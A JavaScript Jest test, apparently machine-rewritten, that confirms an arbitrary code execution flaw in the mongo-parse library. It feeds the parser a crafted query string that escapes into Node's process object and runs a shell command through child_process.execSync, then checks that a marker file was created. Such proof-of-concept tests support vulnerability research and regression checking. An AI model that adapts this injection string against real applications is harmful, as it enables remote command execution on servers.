const v33 = done => {
    const v18 = expect.assertions(2);
    v18;
    const fs = require('fs');
    const parser = require('mongo-parse');
    const path = './mongo-parse';
    try {
        const v19 = fs.existsSync(path);
        if (v19) {
            const v20 = fs.unlinkSync(path);
            v20;
        }
        const v21 = console.log('File removed:', path);
        v21;
    } catch (err) {
        const v22 = console.error(err);
        v22;
    }
    file_exist = fs.existsSync(path);
    const v23 = expect(file_exist);
    const v24 = v23.toBe(false);
    v24;
    try {
        let query = parser.parse('} + clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync("touch mongo-parse") //');
    } catch (error) {
        const v25 = console.log(error);
        v25;
    }
    const v31 = () => {
        file_exist = fs.existsSync(path);
        const v26 = expect(file_exist);
        const v27 = v26.toBe(true);
        v27;
        const v29 = () => {
            const v28 = done();
            v28;
        };
        const v30 = fs.unlink(path, v29);
        v30;
    };
    const v32 = setTimeout(v31, 500);
    v32;
};
const v34 = test('Arbitrary code execution in mongo-parse', v33);
v34;